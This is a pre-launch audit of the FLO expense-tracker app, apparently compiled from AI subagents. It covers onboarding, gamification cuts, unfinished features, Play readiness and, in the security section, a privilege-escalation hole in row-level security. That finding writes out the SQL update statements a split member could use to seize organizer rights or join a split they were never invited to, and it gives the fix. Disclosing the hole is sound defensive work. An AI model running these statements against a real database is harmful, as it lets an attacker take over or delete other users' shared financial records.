# FLO pre-launch audit: retention, scope, security and Play readiness

**Date:** 2026-10-18 · **Build audited:** `master` @ `1e20fdc` + live Supabase project `uergtlcfpwajztqgncim` · **Target:** Google Play first, App Store later

**How this was produced:** six read-only subagents ran in parallel, one per area. They checked pending features, security, UI, UX, Play pre-launch and the mascot, using the installed Expo skills (expo-design-system, expo-native-ui, expo-ui, expo-animation, eas-app-stores, eas-update, expo-upgrade, expo-dev-client) and the security-review mindset. Their findings are merged below. No app code, schema or deployed function was changed in this pass.

**Standing rules respected:**
- No AI features are proposed.
- Auto-detect (the notification listener) stays personal-use only, so every recommendation here is to keep it *out* of the store build, never to harden it.

**Priority scale (used in every section):**
- **P0**: blocks launch, or is the biggest lever.
- **P1**: before launch.
- **P2**: soon after launch.
- **P3**: later or hygiene.

---

## The verdict, straight

FLO is a good expense tracker wrapped in a mobile game, and the game is winning.

- **The gamification layer is about a quarter of the code.** It is roughly 10k of ~41k JS lines: coins, XP, 9 ranks, trophies, 49 card themes, a shop that sells real-money coin packs, a spin wheel and a rewards hub.
- **Onboarding is about 32 screens.** That is roughly 25 taps before the first expense is logged, and 6 of the 10 intro questions configure nothing.
- **The money comes second on Home.** The header shows 7 game controls before the user sees any money.
- **Theming allows 2,254 combinations** (23 accents × 2 modes × 49 card skins), and 13 of the accents fail contrast.
- **Nothing is measured.** There is no analytics SDK, so none of this can be measured, and almost nothing in feature docs 01–31 has a confirmed on-device pass.

The product that retains users is much smaller:
- log an expense in 3 taps;
- import it from a bank SMS or UPI share;
- get one well-timed evening nudge;
- see a weekly "here's where it went" recap;
- keep a forgiving streak.

Cut toward that, measure it, then add back only what the data supports.

Two findings must be fixed before *any* public build, whatever is decided about scope:
1. **A split member can promote themselves to organizer** and wipe or take over a shared split. This is an RLS hole (§3).
2. **The default `production` EAS profile ships the notification-listener service.** The store build has to opt out today; it should be the other way round (§3, §6).

## Where the auditors disagreed, and the call made here

| Topic | Positions | Decision in this doc |
|---|---|---|
| Onboarding target | UX: 4 screens, Google-first, first expense in the real Add sheet. Pending: ≤5 steps including balance. UI: name/currency/balance | **UX's 4-screen flow** (opener → Google → first expense → reminder opt-in). Balance, budget and currency are deferred or defaulted. It is the most retention-focused, and it subsumes the other two |
| Streak chip on Home | UI: remove all gamification chrome. UX: keep the streak chip as the one mechanic kept | **Keep one quiet streak indicator** (the streak is the only mechanic with a proven habit link). Remove coins/freezes/level, Trophy and Shop |
| Plans | UX: cut for v1. Pending: defer the decision until usage data exists | **Hide Plans in v1** (feature-flag it off; keep the code and data). Re-enable only if analytics show demand |
| Accents | UI: one brand accent, optionally 2 more. UX: 4–6 accents | **One brand accent + System/Light/Dark.** Add accents back later only if they pass contrast |
| Split sharing (invites/join) | Pending: hide for v1. Security: two RLS holes in the shared path | **Fix the RLS holes regardless** (the policies are live). **Also hide invites in v1** until settlement confirmation and the activity log exist |
| Pro / payments | All: no billing exists | **Hide every price and Buy button in v1.0**, cut coin packs permanently, and add RevenueCat + Play Billing after launch |

Where the same item came up in several sections, its fullest write-up is kept and the other sections point to it:
- AI functions still deployed → §3
- package id → §6
- auto-detect in production → §3
- Pro billing → §6
- onboarding → §5

---

## 1. Retention and usage changes

This section is drawn from the UX, UI and pending-feature audits. Detail and evidence for each item are in §2, §4 and §5.

#### [P0] Instrument the funnel before (and while) cutting anything
**Problem:** `package.json` has no analytics SDK. Nobody can see onboarding drop-off, activation, D1/D7/D30, or whether gamification moves anything. `age_range` is collected "for analytics" with nowhere to send it.

**Change:** Add PostHog React Native, or a minimal Supabase `events` table behind a `track()` helper in `lib/`.
- **Events:** `onboarding_step_viewed`, `signup_completed`, `transaction_logged {source, seconds_to_save, category_was_default}`, `reminder_sent/opened` (server side), `share_import_received`, `celebration_shown`.
- **Metrics:**
  - activation: first expense within 10 minutes of install;
  - D1/D7/D30 on "logged ≥1";
  - logs per active day;
  - median seconds-to-save;
  - push → log within 30 minutes.
- **Privacy:** no amounts or notes in events (DPDP Act).

**Priority:** P0. Every other change below is a bet until this exists, and the store launch is the only clean cohort you will get.

#### [P0] Cut onboarding to 4 screens and make the first expense the activation moment
**Problem:** About 32 screens and about 25 taps to the first expense. 10 intro questions, of which age, goal, habit, name, problem and solution configure nothing. Then 9 setup steps, a 10-card tour with placeholder images, a welcome bundle, a done screen, and an immediate full-screen "Saver" rank-up for doing nothing.

**Change:** Opener (value line + **Continue with Google**) → Google picker → **first expense in the real Add sheet** → "Want a 9 pm nudge if you haven't logged?" → Home. Default or defer everything else:
- account "Personal";
- currency from locale (INR);
- preset categories;
- weekly recap on;
- budget suggested after 14 days of real data.

Evaluate Supabase anonymous auth next, so the first expense comes *before* sign-up. The full screen table is in §5.

**Priority:** P0. Onboarding drop-off is the largest leak in any consumer finance app, and you already wanted this trim.

#### [P0] Make logging take 3 taps (the core loop)
**Problem:**
- The Add sheet defaults to the *alphabetically first* category (`hooks/useCategories.js:25`).
- Categories are in a horizontal scroller.
- The sheet carries 7 controls around a 2-field task.
- Transfer sits on the type toggle and upsells free users.
- Rewards fire on save.

**Change:**
- Default to the most-used category (by time of day).
- Show a top-8 grid under the amount, with Save pinned above the keyboard.
- Put Date, Account, Split and Note behind "Details".
- Move Transfer to the account card.
- Show no celebration while the sheet is open.
- Target + → digits → Save = 3 taps, under 5 s median.

**Priority:** P0. Every daily log pays this cost. It compounds more than any feature.

#### [P0] One moment queue: at most one full-screen takeover per session
**Problem:** Six overlays fire independently on Home: DueBills, StreakCelebration → SpinWheel, FreezePrompt, RankUp, TrophyToast and RewardBurst (`app/_layout.js:433-437`). Only ad-hoc `isBursting` checks hold them apart. A new user gets 3–4 celebrations before they see Home calmly.

**Change:**
- Add a `MomentQueueProvider` that shows one moment at a time by priority: actionable, then celebratory, then ambient.
- Limit to at most 1 full-screen per session and 2 per day.
- Show nothing during onboarding or while the Add sheet is open.
- Suppress the "Saver" rank.

**Priority:** P0. Modal fatigue trains people to dismiss without reading, and it is the slot-machine signal a money app must not send.

#### [P1] Home answers "how am I doing this month?" in one glance
**Problem:** Coins, freezes, level, streak, Trophy and Shop sit above the ₹ balance. Below them are up to 7 stacked blocks, a chart that duplicates Analytics, and transaction rows that print the category twice and never the note.

**Change:**
- **Header:** account switcher, a quiet streak indicator and the bell.
- **Body:** spent this month (and budget left), then a Today strip with +, then Recent (note / category · date / amount), then upcoming bills only if any exist, then a Monday recap card.
- **Charts:** move to Insights.

**Priority:** P1. Home is seen every session and sets the "serious money app" tone.

#### [P1] Replace the economy with a streak and auto-earned freezes
**Problem:**
- Coins, XP, 9 ranks, trophies, the spin wheel and the shop add up to ~10k lines.
- A freeze costs 3,000 coins (about 120 days of logging), deliberately priced above any single coin pack.
- There are real-money coin packs (₹49–₹999), and no billing exists.
- None of it makes logging faster or more informative.

**Change:**
- **Keep:** the streak, plus one freeze earned per 7-day run (max 2) and applied automatically ("We saved your streak"). Keep milestones at 7/30/100 only.
- **Feature-flag off for v1** (keep the code and stop writing to `reward_events`): coins, XP/ranks, trophies, spin wheel, shop, coin packs, card themes, rewards hub and welcome bundle.

**Priority:** P1. This is the main source of the bloat. Re-introduce pieces only if analytics show the plain streak under-retains.

#### [P1] Notifications: one adaptive evening nudge plus a weekly recap
**Problem:** `send-push` sends an unconditional morning push every day, plus an evening push when nothing is logged, plus bill and report streams. Settings shows both "Notifications" and "Push notifications". The push pipeline has 14 on-device checks still open (§2).

**Change:**
- **Default:** one 21:00 local nudge, sent only if nothing was logged today.
- **Decay:**
  - after 3 ignored days, every other day;
  - after 7, weekly recap only;
  - resume daily on the next log.
- **Morning push:** opt-in.
- **Weekly recap:** Monday 09:00.
- **Bill reminders:** only when bills exist.
- **Settings:** one section with 3 toggles.

**Priority:** P1. Two pushes a day to a disengaged user gets notifications disabled or the app uninstalled, and that is the channel D7/D30 depends on.

#### [P1] A weekly "where it went" recap as the reason to come back
**Problem:** Reports (`app/report.js`, 731 lines) and Analytics overlap. Reports are opt-in in onboarding and buried in Menu.

**Change:**
- One rule-based recap: total vs last week, top 3 categories with deltas, one plain observation ("Food up 32% vs your 4-week average"), and the streak.
- Push it on Monday and show it as that week's Home card.
- Merge Reports into an **Insights** tab with Week, Month and Custom.

**Priority:** P1. It rewards the logging habit with information, which is the actual product.

#### [P1] Finish SMS/UPI share-to-FLO as the "faster than typing" path
**Problem:** Share import exists (`expo-share-intent` + `lib/smsParser.js`) and is store-safe, unlike auto-detect. But it is unverified on device and fills only amount/type, so a share is barely faster than typing.

**Change:**
- Verify with real SBI/HDFC/ICICI/Axis/Kotak SMS and GPay/PhonePe/Paytm receipts.
- Extract payee/merchant.
- Learn a `merchant → category` rules table from the user's corrections (deterministic, not AI), so the second Swiggy share is a one-tap confirm.
- Teach it once, after the first manual log.

**Priority:** P1. In India nearly every spend generates a bank SMS or a UPI receipt. This is the biggest speed gain available within Play policy.

#### [P1] Sign-up: Google first and alone; anonymous-first next
**Problem:** The sign-up form leads with email + password (+ name). Google is the secondary button.

**Change:**
- **Phase A:** Google as the only primary CTA, with email under "Other options".
- **Phase B:** Supabase anonymous session → log first → "Back up your entries with Google" after the first log or on day 2.

Also fix the dead "Forgot password?" link (§2).

**Priority:** P1. It removes the single biggest drop-off step.

#### [P2] Android home-screen widget
**Problem:** Every log means opening the app and tapping +.

**Change:**
- A 2×1 widget showing "Today ₹X · Streak N", with a + that deep-links into the Add sheet.
- Native module plus dev client.
- iOS WidgetKit later.

**Priority:** P2. It has high leverage for daily loggers, but it is native work. Do it after the loop is proven.

#### [P2] Contextual setup and empty states that start the action
**Problem:** Budget size, leak and income are asked at minute one, so the auto-budget is built on guesses. The Budgets/Plans/Bills empty states are one grey line.

**Change:**
- Trigger prompts from data, for example after 14 days: "Your Food spend is ~₹8,400/month. Set a ₹8,000 limit?" (one tap).
- When a payee/amount recurs monthly: "Track this as a bill?"
- Each empty state becomes one suggestion card with a prefilled action (and Koban, §7).

**Priority:** P2. It turns setup from a survey into something visibly useful.

---

## 2. Pending, incomplete and dead feature work

> Source: pending-features audit. Security-relevant overlaps (AI functions, auto-detect in production) are written up in full in §3. Onboarding is in §5. Package id and payments are in §6.

Read-only audit, 2026-10-18. Sources: `.claude/features/00-index.md`, docs 01–31 (checklists and status lines), the code in `app/`, `components/`, `hooks/`, `lib/`, `app.config.js`, `eas.json`, and the live Supabase project `uergtlcfpwajztqgncim` (read-only SELECTs plus the edge function list).

**Headline:** almost nothing in docs 01–31 has a confirmed on-device pass. Only 14 (Pro gates), 18 Phases 1–4 and parts of 05/06 say "confirmed on-device". Everything else stops at "Babel-verified" or "bundle-verified", which only proves the code compiles. About 10k of the ~41k JS lines (25%) are gamification and economy: coins, XP, 9 ranks, trophies, 52 card themes, the spin wheel, freezes, the shop, the rewards hub, the welcome bundle and the tour. Sign-up to first Home screen runs through about 32 screens. The index table is also stale: it has no rows for 14–21, 26, 29 or 30.

### Feature status table

| # | Feature | Real state (docs + code) | Verdict |
|---|---|---|---|
| 01 | Analytics | Built, all boxes ticked; "pending final on-device confirmation" | KEEP, verify |
| 02 | Accounts | Built; on-device pending | KEEP, verify |
| 03 | SMS share import | Built; 7/13 checks are on-device and unticked | KEEP (store-safe `text/*` share target), verify |
| 04 | Notifications + recurring bills | Built; local scheduling replaced by 17 | KEEP (bills), verify |
| 05 | Koban engagement (streak, copy, mascot icon) | Phases 1–4 built; Phase 5 icon wired in `app.json` but checklist unticked; client copy engine `lib/reminderCopy.js` orphaned after 17 | KEEP streak + reminders; tidy |
| 06 | Auto-detect | Personal-use only; `lite` EAS profile strips it, but `production`/`full` profiles still include it | EXCLUDE from store build (make it opt-in) |
| 07 | Onboarding v1 | Superseded by 12 (files deleted) | Done/superseded |
| 08 | Budget periods + detail | Built; 2 on-device checks open | KEEP, verify |
| 09 | Plans that collect | Built; on-device pending | KEEP but simplify (see P2) |
| 10 | Self-transfer | Built; on-device pending | KEEP, verify |
| 11 | Reports | P1–2 + CSV built; PDF deferred | KEEP; PDF stays DEFER |
| 12 | Personal onboarding v2 | Built; 4 on-device checks open; 10 pre-auth intro screens | CUT down hard |
| 13 | AI features | Reverted in code, **but `ai-interpret` AND `ai-report-summary` are still ACTIVE on Supabase** | FINISH removal |
| 14 | Subscription / Pro | Gates built and confirmed on-device; **no billing**, Upgrade is a toast | DEFER billing; hide Pro at launch |
| 15 | Currency going global | Built; on-device check open | KEEP, but hide multi-currency UI for India v1 |
| 16 | App themes | Built; on-device check of every theme never run; ~25 accents × light/dark | CUT to a light/dark toggle |
| 17 | Server push | All 4 phases built; **14 on-device checks open**; live cron runs every 15 min | FINISH verification (P0) |
| 18 | Gamification ritual + ledger | P1–4 on-device confirmed; P5 not confirmed | CUT to streak + freeze only |
| 19 | Card themes | Built (doc header still says "Planned"); 5 unticked; 52 themes in `lib/cardThemes.js` | CUT |
| 20 | Milestone spin wheel | Built, Babel-verified only | CUT |
| 21 | Achievement rewards + milestone road | Built, Babel-verified only | CUT (trophies) or DEFER |
| 22 | Coin store + tiering | Built; **coin-pack Buy stubbed to a toast** | CUT coin packs now; CUT shop with 19 |
| 23 | Personalize hub | Built; on-device pending | CUT with 16/19 |
| 24 | Achievement celebration | **Planned, never built** (0/8) | CUT |
| 25 | Rewards hub sheet | Built, Babel-verified only | CUT with economy |
| 26 | Budget period outcomes (Budget Keeper) | **Planned, never built** (0/30); no `budget_period_outcomes` table; trophy UI shows "Coming soon" | CUT (remove "Coming soon" tiles) |
| 27 | Rank ladder rework | Built; 7 checks open | CUT (ranks) |
| 28 | Welcome bundle + tour | Built; **all 10 tour images are placeholders**; `profiles.tour_seen_at` unused; doc says 3,000 coins, code says 1,000 | CUT tour + bundle |
| 29 | Forgot password | **Planned, blocked on custom SMTP, not started.** The Sign-in "Forgot password?" link has no `onPress` | FINISH (P0) |
| 30 | Summary reset period | Built; on-device pending | KEEP, verify |
| 31 | Split expenses | P1–2 built (create/entries/export/PDF confirmed on-device; settling not). P3 sharing built but never used live (0 invites, 0 joined members). Activity log never written. Settlement confirmation not built | KEEP P1–2 (finish verification); hide P3 sharing (DEFER) |

---

### P0: blocks launch

#### [P0] "Forgot password?" is a dead button and there is no recovery path
**Problem:** `app/sign-in.js:242`: `<Pressable style={styles.forgotRow}>` has no `onPress`. Doc 29 is "BLOCKED on custom SMTP… User chose to pause" (`29-forgot-password.md:4-9`), 0/18 checks. A store user who forgets their password is locked out of their financial data. Supabase's built-in SMTP is only for testing and is heavily rate-limited, so sign-up confirmation emails need custom SMTP anyway.
**Change:** FINISH. Configure custom SMTP (Resend, SES or similar), then build doc 29 as planned (6-digit OTP). If SMTP slips, ship the magic-link fallback the doc already describes rather than a dead link. Remove the link entirely if neither lands.
**Priority rationale:** account lockout with no recovery, plus a visibly broken control on the first screen.

#### [P0] Both AI Edge Functions are still deployed and ACTIVE
**Problem:** `list_edge_functions` returns `ai-interpret` (v4, ACTIVE) and `ai-report-summary` (v6, ACTIVE) next to `send-push`. Their source is gone from the repo (13 doc §status; AGENTS.md says `send-push` is the only function), so they can't be reviewed. They are still callable with any user JWT and may still hold a Gemini key in secrets, which is cost and abuse exposure.
**Change:** FINISH the removal: `supabase functions delete ai-interpret` and `supabase functions delete ai-report-summary`, then delete their API-key secrets. Correct the 00-index line that mentions only `ai-interpret`.
**Priority rationale:** live, unreviewable, billable endpoints for a feature that was removed twice.

#### [P0] Default store build profile still ships auto-detect
**Problem:** `app.config.js:8`: `const AUTO_DETECT = process.env.FLO_VARIANT !== 'lite'`. So `eas build --profile production`, which sets no `FLO_VARIANT` (`eas.json`), links `flo-notification-listener` and shows the "Transaction Detection" card (`app/settings.js:752`). The module ships a personal-use SMS allowlist (`PERSONAL_USE_EXTRA_PACKAGES`), which 00-index calls store-illegal.
**Change:** EXCLUDE by default. Flip the flag to opt-in (`FLO_VARIANT === 'personal'`), make `production` the lite build, and rename `full` to `personal` with no `submit` entry. Check the merged release manifest (00-index note 4) for no `BIND_NOTIFICATION_LISTENER_SERVICE`.
**Priority rationale:** one wrong profile name gets the app rejected or flagged by Play.

#### [P0] Pro has no billing: Upgrade and coin-pack Buy are toasts
**Problem:** `app/pro.js:27-28` shows "Payments aren't live yet…". `lib/coins.js:7` says "UI-ONLY… Buy is stubbed", and `app/shop.js:263` does the same. Free limits are enforced at create time (`lib/pro.js` `FREE_LIMITS`, gates in `budgets.js`/`plans.js`/`splits.js`/`AccountHeroCarousel.js`/`report.js`), so v1 users would hit paywalls they can't pay through.
**Change:** pick one before launch. **Recommended: DEFER billing and hide every Pro surface in v1**: no `/pro` route, no `ProUpsellSheet`, no crown badges, and limits off or raised. Ship Play Billing (RevenueCat) once retention data exists. **CUT coin packs outright.** Selling virtual currency in a finance tracker conflicts with `IDEAS-gamification.md`'s "earned-only" rule that 22 reversed.
**Priority rationale:** a paywall with no payment path reads as broken and invites a policy rejection.

#### [P0] Server push (17) has never been verified on a device but already runs live
**Problem:** `17-server-push-notifications.md` has 14 unticked checks: delivery with the app closed, local-time scheduling, evening suppression, bill and report pushes, and no leftover local schedules (lines 187–190, 397–401, 561–564, 622). The cron job `send-reminders */15 * * * *` is live, and `reminder_sends` already holds 677 rows. Push is the main retention lever, and it is unproven.
**Change:** FINISH: one full on-device pass over the doc's checklist on a release APK. Make sure no locally scheduled nudges are left (the "Old local … no longer fires" items).
**Priority rationale:** the retention channel must actually deliver, and the wrong copy or time hurts more than no push.

#### [P0] Placeholder package id
**Problem:** `app.json` has `"package": "com.anonymous.flo"` (00-index note 7). It can't change after the first Play upload.
**Change:** FINISH: set the real reverse-domain id before the first upload.
**Priority rationale:** it's irreversible once the first build is uploaded.

---

### P1: before launch

#### [P1] Onboarding is about 32 screens before Home
**Problem:** `lib/onboarding.js`: 10 pre-auth `INTRO_STEPS` (opener → reflection), then sign-up, 9 setup `STEPS` (account, currency, categories, balance, expense, budget, reports, reminders, journey), 10 `TOUR_STEPS`, the welcome bundle and done. `age_range` is collected (`app/onboarding/intro/age.js`) and never read, which breaks doc 12's own rule that every question must configure something real. The memory note says the owner wants to trim this after the tour ships. The recommendation here is to cut the tour itself.
**Change:** CUT to at most 5 steps: sign-up → (name, if not from sign-up) → starting balance → log first expense → reminder opt-in → Home. Remove the intro questionnaire (keep at most one pain-point screen), `currency` (INR default; India market), `categories`, `reports`, `journey`, and the whole 28 tour and welcome bundle. Size the first budget later, from real spend.
**Priority rationale:** every screen before the first logged expense costs sign-ups, and this is the biggest retention lever in the codebase.

#### [P1] Tour (28) ships with 10 placeholder images
**Problem:** `app/onboarding/tour/[step].js:29-40`: every `TOUR_IMAGES` line is commented out. `assets/tour/` contains only `BRIEF.md`, and `components/TourScreen.js` renders an icon plus "Preview" box. The doc says "tour images are placeholders".
**Change:** CUT the tour (`app/onboarding/tour/`, `components/TourScreen.js`, `TOUR_STEPS`, `assets/tour/`) and the welcome-bundle screen. Use contextual empty states instead. Drop the unused `profiles.tour_seen_at` column (3 stale rows from the abandoned approach, no reader or writer in code).
**Priority rationale:** placeholder art on first launch looks unfinished, and the tour only exists to explain a surface that is itself too big.

#### [P1] Gamification and economy surface: cut to streak + freeze
**Problem:** Docs 18 (P5), 19, 20, 21, 22, 23, 25 and 27 add coins, XP, 9 ranks with themes and a freeze cap, trophy groups, 52 card themes across 8 tiers, a spin wheel on milestone days, a shop, a rewards hub, a rank-up celebration and a milestone road. Most are Babel-verified only, with many open checks (19: 5, 27: 7). Main files: `lib/rewards.js`, `lib/rewardsMutations.js`, `lib/trophies.js`, `lib/cardThemes.js` (1.2k lines), `lib/coins.js`, `app/shop.js`, `app/trophies.js`, `app/personalize.js`, `components/MilestoneSpinWheel.js`, `RankUpCelebration.js`, `RewardBurst.js`, `RewardsHistorySheet.js`, `TrophyToast.js`, `CardThemeSurface.js`, `PersonalizePreview.js`, plus about 100 badge PNGs. That's roughly 10k lines. None of it helps someone log an expense or understand their spending.
**Change:** CUT for v1. Keep the **streak** (`lib/streak.js`, `useStreak`, `app/streak.js`, `StreakCelebration` minus the spin wheel) and a **free streak freeze** (granted every N days, not bought with coins). Remove coins, XP, ranks, trophies, card themes, shop, spin wheel, rewards hub, personalize hub and welcome bundle. Leave the `reward_events` table in place (168 rows) and stop writing to it, so the system could return after launch if data supports it.
**Priority rationale:** this is the main source of the bloat. It adds celebration overlap and sequencing bugs (see the 27 FINDINGS doc), and its retention value is unproven compared with a plain streak.

#### [P1] App themes (16) and Personalize (23): accent picker is surplus
**Problem:** `theme/themes.js` defines about 25 accents (lime … cream) × light/dark. The 16 doc's on-device check of every theme was never run (`16-app-themes.md:687-688`). Meanwhile `app.json` pins `"userInterfaceStyle": "light"`. The owner may redesign the UI completely.
**Change:** CUT to one brand accent plus a light/dark (system) toggle in Settings. Delete `app/personalize.js`, `ColorPicker.js`, `AppearanceToggle.js` (or fold a simple toggle into Settings) and `PersonalizePreview.js`. Keep the `useTheme()` token architecture, which is useful for the redesign. Leave `theme_accent` and `equipped_card_theme` on profiles unused, then drop them.
**Priority rationale:** each extra accent multiplies the QA matrix for no retention gain.

#### [P1] Budget Keeper trophies say "Coming soon" (26 never built)
**Problem:** `app/trophies.js:297` and `lib/trophies.js:237` (`budget_keeper: … "Coming soon — …"`). Doc 26 is 0/30 and the `budget_period_outcomes` table doesn't exist live.
**Change:** CUT. It goes with the trophies cut. If trophies stay, at least remove the Budget Keeper group. Don't build 26.
**Priority rationale:** "Coming soon" tiles in a v1 tell users the app is unfinished.

#### [P1] Achievement celebration (24): planned, never built
**Problem:** `24-achievement-celebration.md:4`: "Planned, not built", 0/8 checks.
**Change:** CUT. Archive the doc as not pursued.
**Priority rationale:** more celebration surface is the opposite of the direction the owner wants.

#### [P1] Splits (31): hide the half-built sharing layer, finish the solo core
**Problem:** Phase 3 (invites, join flow `app/join/[code].js`, membership RLS) is built, but settlement confirmation is not, so "two people recording the same payment double-counts" (index row 31). `lib/splits.js:307` `logActivity()` is **never called anywhere**, and `split_activity` has 0 rows. Yet the comment there says the append-only log is "the reason the permissive role model is safe (Decision 6)", so that safety rationale doesn't hold today. Live data: 2 splits, 0 invites, 0 joined members, so sharing has never been exercised. Phase 1 settling checks are unticked (`31-split-expenses.md:947-957`), as is the Phase 3 RLS checklist (1940-1946).
**Change:** FINISH the on-device pass for P1–2 (settle → one ledger row, close/reopen, account scoping). DEFER P3: hide the invite/share UI and `/join/[code]` in v1 and revisit with the activity log wired up and settlement confirmation built.
**Priority rationale:** the shared-ledger double-count and the missing audit trail are trust bugs in a money app, and only the shared path has them.

#### [P1] Developer-only UI left in user Settings
**Problem:** `app/settings.js:591-613` shows a "Push notifications" row with "Needs a development build, not Expo Go." and a **"Send test"** button. Detection debug log rows sit at `:257-279` (auto-detect variant only). Doc 05/17 test helpers (`sendTestNotification`, `getScheduledSummary` in `lib/notifications.js`) are still exported.
**Change:** CUT from release builds: gate behind `__DEV__` the way `components/OnboardingDevBack.js:21` already does.
**Priority rationale:** dev diagnostics in a store build look amateurish.

#### [P1] On-device verification backlog for the core keepers
**Problem:** These are built but have never been confirmed on a device: 01, 02, 03 (`03-sms-share-import.md:79-186`), 08 (`:308`, `:473`), 09, 10, 11, 15 (`:549`), 30 (`:324-330`).
**Change:** FINISH: one scripted release-APK pass over these checklists only. Skip the cut features.
**Priority rationale:** bundling doesn't prove behaviour, and these are the flows users actually depend on.

---

### P2: soon after launch

#### [P2] Multi-currency (15): hide for the India launch
**Problem:** Per-account currency, the `app/onboarding/currency.js` step and mixed-currency report filtering (`app/report.js:150-189`) add complexity for an INR-only market. The on-device check is open (`15-…:549`).
**Change:** DEFER exposure. Keep the data model (`accounts.currency`, `profiles.currency` seeds new accounts and is **not** dead, contrary to `IDEAS.md`), but remove the onboarding step and the per-account picker in v1. Default to INR.
**Priority rationale:** it's cheap to hide, and it removes an onboarding screen plus a source of report edge cases.

#### [P2] Plans "collecting" mode and add-from-history (09)
**Problem:** Plans, collecting mode (`plans.is_collecting`) and splits linked to plans overlap with budgets. There are now three goal-like concepts: budgets, plans and splits.
**Change:** DEFER the decision: watch usage after launch and merge or cut Plans if it's rarely used. Don't extend it.
**Priority rationale:** overlapping concepts confuse new users, but this needs usage data first.

#### [P2] Reports PDF export (11)
**Problem:** `11-reports.md:696`: deferred by the owner. CSV exists.
**Change:** DEFER (unchanged).
**Priority rationale:** nice to have, not a retention driver.

---

### P3: later / hygiene

#### [P3] Orphaned files nothing imports
**Problem:** These files have no importers (checked with an import-graph script over `app/ components/ hooks/ lib/`):
- `components/CountUp.js`: its last consumer went with the onboarding rework.
- `components/Logo.js`: only referenced in comments.
- `components/PartyPopper.js`: a doc 07 leftover; 00-index wrongly lists it as "retained".
- `components/StreakFlameIcon.js`
- `lib/reminderCopy.js`: the client copy engine, orphaned once nudges moved to `send-push/reminderCopy.ts`.

Also dead: the `MILESTONE_THEME_GRANTS = {}` export in `lib/rewards.js:114`. Unreferenced assets: `assets/*_backup.png`, `assets/general/freeze_bu.png`, `assets/mascot/hey_screen_bu.png` and `assets/notification-icon-source-1024.png`; also the `.md` briefs in `assets/`.
**Change:** CUT (delete).
**Priority rationale:** clutter only, with no user impact.

#### [P3] Dead or stale DB columns and data
**Problem:**
- `profiles.tour_seen_at`: no reader or writer in code; 3 stale rows.
- `profiles.onboarding_answers.age_range`: written, never read.
- `split_activity`: never written (see P1).
- After the P1 cuts, `theme_accent`, `equipped_card_theme` and `highest_rank_seen` on profiles become dead.
- `profiles.currency` is **live** (it seeds new accounts: `components/AddAccountSheet.js:85`, `AddBillSheet.js:92`, `app/settings.js:387`), so it isn't dead.
**Change:** CUT via a migration once the P1 cuts land. Keep `profiles.currency`.
**Priority rationale:** schema hygiene, low risk, best done in one cleanup migration.

#### [P3] Design record drift
**Problem:**
- The 00-index table has no rows for 14–21, 26, 29 or 30.
- 19, 22, 23, 25 and 26 headers still say "Status: Planned" even though they're built (except 26).
- 28's doc and index say 3,000 welcome coins; the code (`lib/rewards.js:60`) gives 1,000.
- 00-index calls `PartyPopper.js` retained; it's orphaned.
- 05 Phase 5 is unticked but is in fact wired.
**Change:** FINISH: after the cuts, rewrite the index table once, mark cut features 🗑️ with a date, and archive their docs.
**Priority rationale:** the docs are the design record, and they're starting to mislead.

---

## 3. Security

> Source: security audit (live DB read through the Supabase MCP, repo, release manifest). send-push was hardened earlier today (v9) and is listed under Verified OK.

Read-only. Sources: live DB via Supabase MCP (`pg_policies`, `pg_proc`, `information_schema`, `pg_constraint`, `pg_trigger`, `storage.buckets`, advisors, edge functions), repo source, `android/` prebuild output, and the release merged manifest at `android/app/build/intermediates/merged_manifest/release/processReleaseMainManifest/AndroidManifest.xml` (built 2026-08-26).

---

#### [P0] A split member can promote themselves to organizer, or move their membership into another split

**Problem:** Policy `split_members_update` on `public.split_members`:
`USING/WITH CHECK ((split_role(split_id) = 'organizer') OR (member_user_id = auth.uid()))`.
The second branch lets any member update **any column** of their own row. There is no trigger or column grant to stop it (`authenticated` has full UPDATE on the table; no triggers on split tables).
- `update split_members set role='organizer' where member_user_id = auth.uid()` passes. `split_role()` then returns `'organizer'` (it reads `m.role`), which unlocks `splits_update`, `splits_delete` (deletes the split and cascades every entry, share, and settlement), `split_members_delete` (remove other people), `split_invites_all`, and organizer edits of everyone's entries and settlements. `splits_update` then also lets the attacker set `splits.user_id` to themselves and take ownership.
- `update split_members set split_id='<other split uuid>'` also passes the WITH CHECK through the `member_user_id` branch, which gives the attacker read access (and, combined with the above, organizer access) to a split they were never invited to. This needs the target's split UUID. UUIDs are not guessable, but `preview_split_invite` returns `split_id`, so every invite link reveals one.

Anyone who has ever held a valid invite link can exploit this with the anon key and one REST call.

**Change:** Split the member branch out and lock its columns:
```sql
drop policy split_members_update on split_members;
create policy split_members_update_organizer on split_members for update
  using (split_role(split_id) = 'organizer') with check (split_role(split_id) = 'organizer');
-- members may only edit their own display_name
create policy split_members_update_self on split_members for update
  using (member_user_id = (select auth.uid())) with check (member_user_id = (select auth.uid()));
revoke update on split_members from authenticated, anon;
grant update (display_name) on split_members to authenticated;
```
(If organizers need to update other columns, do it through a SECURITY INVOKER RPC or add a BEFORE UPDATE trigger that rejects changes to `split_id`, `role`, `user_id`, `is_self`, `person_id`, or `member_user_id` unless `split_role(OLD.split_id)='organizer'`, and that always rejects a `split_id` change.) Also add the check `role <> 'organizer' OR <caller is splits.user_id>` so only the creator can grant organizer.

**Priority rationale:** Trivial and remote. Any invited member can take over or wipe a shared money record in one REST call.

#### [P0] The default `production` EAS profile ships the notification-listener (auto-detect) service

**Problem:** `app.config.js:7` uses `const AUTO_DETECT = process.env.FLO_VARIANT !== 'lite';`, so auto-detect is on unless the build opts out. In `eas.json`, the `production` profile (and `preview` and `development`) sets no `FLO_VARIANT`. Only `lite` and `lite-preview` exclude the module. The last release merged manifest contains `com.anonymous.flo.detect.FloNotificationListenerService` with `BIND_NOTIFICATION_LISTENER_SERVICE` (from `modules/flo-notification-listener/android/.../AndroidManifest.xml`). A plain `eas build --profile production` sends this to Play. The standing rule says it must never reach a store build. Play also requires a notification-access declaration and would likely reject or suspend the app.

**Change:** Flip the default so the store path is safe: `const AUTO_DETECT = process.env.FLO_VARIANT === 'full';`. Make `production` set `FLO_VARIANT=lite` explicitly, and remove or rename the `full` store profile (`eas.json` `build.full` and `submit.full`) so nothing named "production" or "submit" can carry the listener. Before any upload, check that the generated `AndroidManifest.xml` has no `NotificationListenerService`.

**Priority rationale:** It ships through the default build command, and it is both a policy violation and a data-access surface over every notification on the device.

---

#### [P1] Cross-tenant foreign keys: a split member can stop the organizer from deleting their account

